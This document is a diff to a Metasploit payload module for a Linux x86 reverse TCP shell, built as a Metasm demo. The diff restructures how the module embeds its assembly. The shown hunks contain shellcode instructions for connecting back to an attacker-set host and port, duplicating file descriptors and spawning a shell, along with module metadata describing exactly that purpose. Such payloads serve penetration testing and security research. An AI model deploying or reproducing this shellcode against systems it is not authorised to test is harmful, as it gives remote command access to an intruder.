@@ -31,8 +31,25 @@ module ShellReverseTcp2
 
 # We decoded skape's shellcode by using irb -r metasm-shell
 # and: puts shellcode.decode
-	sc=Metasm::Shellcode.assemble(Metasm::Ia32.new, <<EOS).encoded
-xor ebx, ebx                  ; @00000000   31db
+		super(merge_info(info,
+			'Name'          => 'Linux Command Shell, Reverse TCP Inline - Metasm demo',
+			'Version'       => '$Revision: 4984 $',
+			'Description'   => 'Connect back to attacker and spawn a command shell',
+			'Author'        => 'skape + Yoann Guillot and Julien Tinnes for metasm PoC',
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'linux',
+			'Arch'          => ARCH_X86,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'Payload'       =>
+				{
+					'Offsets' =>
+						{
+							'LHOST'    => [ 0, 'ADDR' ],
+							'LPORT'    => [ 0, 'n'    ],
+						},
+					'Assembly' => <<EOS
+  xor ebx, ebx                  ; @00000000   31db
   push ebx                      ; @00000002   53
   inc ebx                       ; @00000003   43
   push ebx                      ; @00000004   53
@@ -45,11 +62,11 @@ xor ebx, ebx                  ; @00000000   31db
   pop ecx                       ; @0000000f   59
 
 ; Xrefs: 0000000f, 00000015
-xref_00000010_uuidfdbd8f60c:
+xref_00000010_uuidfdbd8:
   mov al, 3fh                   ; @00000010   b03f
   int 80h                       ; @00000012   cd80
   dec ecx                       ; @00000014   49
-  jns xref_00000010_uuidfdbd8f60c ; @00000015   79f9  -- to 10h
+  jns xref_00000010_uuidfdbd8   ; @00000015   79f9  -- to 10h
 
 ; Xrefs: 00000015
   pop ebx                       ; @00000017   5b
@@ -76,26 +93,7 @@ xref_00000010_uuidfdbd8f60c:
   mov al, 0bh                   ; @00000042   b00b
   int 80h                       ; @00000044   cd80
 EOS
-
-		super(merge_info(info,
-			'Name'          => 'Linux Command Shell, Reverse TCP Inline - Metasm demo',
-			'Version'       => '$Revision: 4984 $',
-			'Description'   => 'Connect back to attacker and spawn a command shell',
-			'Author'        => 'skape + Yoann Guillot and Julien Tinnes for metasm PoC',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'linux',
-			'Arch'          => ARCH_X86,
-			'Handler'       => Msf::Handler::ReverseTcp,
-			'Session'       => Msf::Sessions::CommandShell,
-			'Payload'       =>
-				{
-					'Offsets' =>
-						{
-							'LHOST'    => [ sc.offset_of_reloc('LHOST'), 'ADDR' ],
-							'LPORT'    => [ sc.offset_of_reloc('LPORT'), 'n'    ],
-						},
-					'Payload' => sc.data
-									}
+					}
 			))
 	end
 
